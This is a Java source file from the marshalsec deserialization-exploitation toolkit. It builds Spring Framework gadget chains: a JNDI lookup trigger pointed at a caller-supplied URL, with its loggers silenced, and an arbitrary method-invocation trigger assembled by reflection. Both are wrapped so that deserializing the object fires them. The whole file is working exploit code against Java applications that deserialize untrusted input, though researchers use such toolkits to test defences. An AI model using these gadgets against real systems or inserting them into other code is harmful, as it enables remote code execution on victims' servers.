/* MIT License

Copyright (c) 2017 Moritz Bechler

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/
package marshalsec.gadgets;


import java.lang.reflect.InvocationTargetException;
import java.util.HashSet;
import java.util.Map;

import org.apache.commons.logging.impl.NoOpLog;
import org.springframework.aop.aspectj.AbstractAspectJAdvice;
import org.springframework.aop.aspectj.AspectInstanceFactory;
import org.springframework.aop.aspectj.AspectJAroundAdvice;
import org.springframework.aop.aspectj.AspectJPointcutAdvisor;
import org.springframework.aop.aspectj.annotation.BeanFactoryAspectInstanceFactory;
import org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor;
import org.springframework.beans.factory.BeanFactory;
import org.springframework.beans.factory.support.DefaultListableBeanFactory;
import org.springframework.beans.factory.support.RootBeanDefinition;
import org.springframework.jndi.support.SimpleJndiBeanFactory;

import marshalsec.UtilFactory;
import marshalsec.util.Reflections;


/**
 * @author mbechler
 *
 */
public final class SpringUtil {

    /**
     * 
     */
    private SpringUtil () {}


    public static BeanFactory makeJNDITrigger ( String jndiUrl ) throws Exception {
        SimpleJndiBeanFactory bf = new SimpleJndiBeanFactory();
        bf.setShareableResources(jndiUrl);
        Reflections.setFieldValue(bf, "logger", new NoOpLog());
        Reflections.setFieldValue(bf.getJndiTemplate(), "logger", new NoOpLog());
        return bf;
    }


    public static BeanFactory makeMethodTrigger ( Object o, String method ) throws Exception {
        DefaultListableBeanFactory bf = new DefaultListableBeanFactory();
        RootBeanDefinition caller = new RootBeanDefinition();

        caller.setFactoryBeanName("obj");
        caller.setFactoryMethodName(method);
        Reflections.setFieldValue(caller.getMethodOverrides(), "overrides", new HashSet<>());
        bf.registerBeanDefinition("caller", caller);

        Reflections.getField(DefaultListableBeanFactory.class, "beanClassLoader").set(bf, null);
        Reflections.getField(DefaultListableBeanFactory.class, "alreadyCreated").set(bf, new HashSet<>());
        Reflections.getField(DefaultListableBeanFactory.class, "singletonsCurrentlyInCreation").set(bf, new HashSet<>());
        Reflections.getField(DefaultListableBeanFactory.class, "inCreationCheckExclusions").set(bf, new HashSet<>());
        Reflections.getField(DefaultListableBeanFactory.class, "logger").set(bf, new NoOpLog());
        Reflections.getField(DefaultListableBeanFactory.class, "prototypesCurrentlyInCreation").set(bf, new ThreadLocal<>());

        @SuppressWarnings ( "unchecked" )
        Map<String, Object> objs = (Map<String, Object>) Reflections.getFieldValue(bf, "singletonObjects");
        objs.put("obj", o);
        return bf;
    }


    public static Object makeBeanFactoryTriggerBFPA ( UtilFactory uf, String name, BeanFactory bf ) throws Exception {
        DefaultBeanFactoryPointcutAdvisor pcadv = new DefaultBeanFactoryPointcutAdvisor();
        pcadv.setBeanFactory(bf);
        pcadv.setAdviceBeanName(name);
        return uf.makeEqualsTrigger(pcadv, new DefaultBeanFactoryPointcutAdvisor());
    }


    /**
     * @param jndiUrl
     * @param bf
     * @return
     * @throws ClassNotFoundException
     * @throws NoSuchMethodException
     * @throws InstantiationException
     * @throws IllegalAccessException
     * @throws InvocationTargetException
     * @throws Exception
     */
    public static Object makeBeanFactoryTriggerPCAH ( UtilFactory uf, String name, BeanFactory bf ) throws ClassNotFoundException,
            NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, Exception {
        AspectInstanceFactory aif = Reflections.createWithoutConstructor(BeanFactoryAspectInstanceFactory.class);
        Reflections.setFieldValue(aif, "beanFactory", bf);
        Reflections.setFieldValue(aif, "name", name);
        AbstractAspectJAdvice advice = Reflections.createWithoutConstructor(AspectJAroundAdvice.class);
        Reflections.setFieldValue(advice, "aspectInstanceFactory", aif);
    
        // make readObject happy if it is called
        Reflections.setFieldValue(advice, "declaringClass", Object.class);
        Reflections.setFieldValue(advice, "methodName", "toString");
        Reflections.setFieldValue(advice, "parameterTypes", new Class[0]);
    
        AspectJPointcutAdvisor advisor = Reflections.createWithoutConstructor(AspectJPointcutAdvisor.class);
        Reflections.setFieldValue(advisor, "advice", advice);
    
        Class<?> pcahCl = Class
                .forName("org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder");
        Object pcah = Reflections.createWithoutConstructor(pcahCl);
        Reflections.setFieldValue(pcah, "advisor", advisor);
        return uf.makeToStringTriggerUnstable(pcah);
    }
}
